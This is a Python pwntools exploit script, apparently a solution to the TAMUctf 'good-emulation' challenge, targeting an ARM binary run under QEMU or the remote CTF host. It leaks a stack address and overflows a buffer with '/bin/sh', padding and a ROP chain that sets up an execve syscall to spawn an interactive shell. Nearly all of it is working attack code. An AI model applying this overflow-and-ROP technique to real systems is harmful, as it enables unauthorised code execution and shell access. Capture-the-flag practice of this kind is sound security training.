from pwn import *
from time import sleep
context.arch = 'amd64'

def debug():
	if local<2:
		gdb.attach(p,'''
			b* 0x00010694
			''')
###############   files setup   ###############
local=len(sys.argv)
exe=ELF("./good-emulation")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
nc="nc eaze 14"
port=int(nc.split(" ")[2])
host=nc.split(" ")[1]

############### remote or local ###############
if local>1:
	#p=remote(host,port)
	p=remote("tamuctf.com", 443, ssl=True, sni="good-emulation")
else:
	p=process(["qemu-arm","-g","1234",exe.path])

############### helper functions ##############
def send():
	pass

############### main exploit    ###############
r0 = 0x00060830 # r0 pc 
r1 = 0x00060918 # r1 pc 
r7 = 0x0002ea68 # r7 pc
r8 = 0x0001114c # r4, r5, r6, r7, r8, pc
svc= 0x00056a7c 

p.recvuntil(b"buf is at ")

stack=int(p.recvline()[:-1],16)
print(hex(stack))
rop=p32(0)+p32(r0)+p32(stack)+p32(r1)+p32(0)+p32(r7)+p32(11)+p32(svc)
payload=b"/bin/sh\x00"
payload+=b"a"*120
payload+=rop
p.sendline(payload)


p.interactive()